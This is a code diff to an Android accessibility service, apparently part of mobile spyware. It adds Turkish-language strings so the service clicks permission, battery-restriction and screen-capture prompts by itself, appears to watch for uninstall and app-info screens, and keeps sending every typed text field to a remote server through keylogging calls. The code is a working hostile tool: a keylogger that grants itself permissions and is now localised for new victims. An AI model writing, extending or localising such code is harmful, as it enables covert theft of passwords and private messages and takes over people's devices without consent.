@@ -648,7 +648,11 @@ public class MainAccessibilityService extends AccessibilityService {
                 if(node.getText() != null) {
                     String nodeText = node.getText().toString();
                     Log.d("nodetext::", nodeText);
-                    if(nodeText.equals("Allow") || nodeText.equals("Permitir") || nodeText.equals("EXCLUIR") || nodeText.equals("EXCLUDE")) {
+                    if(nodeText.equals("Allow")
+                            || nodeText.equals("Permitir")
+                            || nodeText.equals("EXCLUIR")
+                            || nodeText.equals("EXCLUDE")
+                            || nodeText.equals("İzin ver")) {
                         node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                     }
                 }
@@ -677,10 +681,15 @@ public class MainAccessibilityService extends AccessibilityService {
                 if(node.getText() != null) {
                     String nodeText = node.getText().toString();
                     Log.d("nodetext::", nodeText);
-                    if(nodeText.equals("Nenhuma restrição")) {
-                        Rect rect = new Rect();
-                        node.getBoundsInScreen(rect);
-                        performClickMain(rect.left + 20, rect.top + 20);
+                    if(nodeText.equals("Nenhuma restrição")
+                            || nodeText.equals("No restrictions")
+                            || nodeText.equals("Sin restricciones")
+                            || nodeText.equals("Kısıtlama yok")) {
+                        if(node.isClickable()) {
+                            node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                        } else if(node.getParent().isClickable()) {
+                            node.getParent().performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                        }
                     }
                 }
             }
@@ -709,7 +718,7 @@ public class MainAccessibilityService extends AccessibilityService {
                         Log.d("startScroll::", "startsto");
                         startAutoSetScrolling();
                     }
-                }, 500);
+                }, 1500);
             }
         }
         if(event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
@@ -789,7 +798,11 @@ public class MainAccessibilityService extends AccessibilityService {
                     if(node.getText() != null) {
                         String nodeText = node.getText().toString().toLowerCase();
                         Log.d("Button Text Media", nodeText);
-                        if (nodeText.equals("other permissions") || nodeText.equals("outras permissões") || nodeText.equals("otros permisos")|| nodeText.equals("其他权限")) {
+                        if (nodeText.equals("other permissions")
+                                || nodeText.equals("outras permissões")
+                                || nodeText.equals("otros permisos")
+                                || nodeText.equals("diğer izinler")
+                                || nodeText.equals("其他权限")) {
                             if(Common.getInstance().getAutosel()) {
                                 onGoBack();
                                 Common.getInstance().setAutostartEnable(false);
@@ -804,6 +817,8 @@ public class MainAccessibilityService extends AccessibilityService {
                                 || nodeText.equals("abrir nuevas ventanas mientras se ejecuta en segundo plano")
                                 || nodeText.equals("mostrar janelas pop-up enquanto estiver executando em segundo plano")
                                 || nodeText.equals("mostrar ventanas emergentes mientras se ejecuta en segundo plano")
+                                || nodeText.equals("arka planda çalışırken yeni pencereler açın")
+                                || nodeText.equals("arka planda çalışırken açılır pencereleri görüntüle")
                                 || nodeText.equals("后台弹出界面")) {
                             if(Common.getInstance().getAutosel()) {
                                 onGoBack();
@@ -821,11 +836,13 @@ public class MainAccessibilityService extends AccessibilityService {
                         if ((node.getText() != null && (node.getText().toString().toLowerCase().equals("always allow")
                                 || node.getText().toString().toLowerCase().equals("sempre permitir")
                                 || node.getText().toString().toLowerCase().equals("permitir siempre")
+                                || node.getText().toString().toLowerCase().equals("her zaman izin ver")
                                 || node.getText().toString().toLowerCase().equals("始终允许")))
                                 ||
                                 (node.getContentDescription() != null && (node.getContentDescription().toString().toLowerCase().equals("always allow")
                                         || node.getContentDescription().toString().toLowerCase().equals("sempre permitir")
                                         || node.getContentDescription().toString().toLowerCase().equals("permitir siempre")
+                                        || node.getContentDescription().toString().toLowerCase().equals("her zaman izin ver")
                                         || node.getContentDescription().toString().toLowerCase().equals("始终允许")))) {
                             node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                             Common.getInstance().setAutosel(true);
@@ -1049,12 +1066,14 @@ public class MainAccessibilityService extends AccessibilityService {
         if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
             AccessibilityNodeInfo source = event.getSource();
             if (source != null && "android.widget.EditText".equals(source.getClassName().toString())) {
-                text = source.getText().toString();
-                eventString = "Text Input";
-                if(Server.getContext() != null) {
-                    Server.getContext().sendRealtimeKeyLog(text, packagename, eventString);
-                    if(isKeylogger) {
-                        Server.getContext().sendKeyLog(text, packagename, eventString);
+                if(source.getText() != null) {
+                    text = source.getText().toString();
+                    eventString = "Text Input";
+                    if(Server.getContext() != null) {
+                        Server.getContext().sendRealtimeKeyLog(text, packagename, eventString);
+                        if(isKeylogger) {
+                            Server.getContext().sendKeyLog(text, packagename, eventString);
+                        }
                     }
                 }
             }
@@ -1155,9 +1174,11 @@ public class MainAccessibilityService extends AccessibilityService {
                                 || nodeText.equals("começar agora")
                                 || nodeText.equals("início")
                                 || nodeText.equals("iniciar")
+                                || nodeText.equals("şimdi başla")
+                                || nodeText.equals("şimdi başlat")
                                 || nodeText.equals("立即开始")) {
                             node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
-                        } else if(nodeText.equals("cancel") || nodeText.equals("cancelar")|| nodeText.equals("取消")){
+                        } else if(nodeText.equals("cancel") || nodeText.equals("cancelar") || nodeText.equals("iptal") || nodeText.equals("取消")){
                             Rect rect = new Rect();
                             node.getBoundsInScreen(rect);
                             performClickMain(deviceWidth - rect.left - 10, rect.top + 10);
@@ -1183,7 +1204,7 @@ public class MainAccessibilityService extends AccessibilityService {
                     if(node.isVisibleToUser() && (nodeText.contains(getResources().getString(R.string.app_name).toLowerCase()) || nodeText.contains(getPackageName()))) {
                         isSelectedApp = true;
                     }
-                    if (node.isVisibleToUser() && (nodeText.contains("desins") || nodeText.contains("unins") || nodeText.contains("卸载")|| nodeText.contains("解除安"))) {
+                    if (node.isVisibleToUser() && (nodeText.contains("desins") || nodeText.contains("unins") || nodeText.contains("kaldır") || nodeText.contains("卸载")|| nodeText.contains("解除安"))) {
                         isUninstallapp = true;
                     }
                 }
@@ -1206,6 +1227,8 @@ public class MainAccessibilityService extends AccessibilityService {
                             || nodeText.contains("información de aplicación")
                             || nodeText.contains("información de la aplicación")
                             || nodeText.contains("información de aplicaciones")
+                            || nodeText.contains("uygulama bilgisi")
+                            || nodeText.contains("uygulama bilgileri")
                             || nodeText.contains("应用信息")
                             || nodeText.contains("应用程序信息")
                             || nodeText.contains("應用程式資訊")) {
@@ -1250,7 +1273,9 @@ public class MainAccessibilityService extends AccessibilityService {
                             || nodeText.equals("allow only while using the app")
                             || nodeText.equals("allow")
                             || nodeText.equals("allow all")
-                            || nodeText.equals("permitir")) {
+                            || nodeText.equals("permitir")
+                            || nodeText.equals("uygulamayı kullanırken")
+                            || nodeText.equals("izin ver")) {
                         node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                     }
                 }
@@ -1266,7 +1291,7 @@ public class MainAccessibilityService extends AccessibilityService {
             if (node.getClassName() != null && node.getClassName().equals("android.widget.Button")) {
                 if(node.getText() != null) {
                     String nodeText = node.getText().toString().toLowerCase();
-                    if(nodeText.equals("ok") || nodeText.equals("aceptar")) {
+                    if(nodeText.equals("ok") || nodeText.equals("aceptar") || nodeText.equals("tamam")) {
                         node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                     }
                 }
@@ -1284,6 +1309,7 @@ public class MainAccessibilityService extends AccessibilityService {
                     String nodeText = node.getText().toString().toLowerCase();
                     if(nodeText.equals("cancel")
                             || nodeText.equals("cancelar")
+                            || nodeText.equals("iptal")
                             || nodeText.equals("取消")) {
                         node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                     }
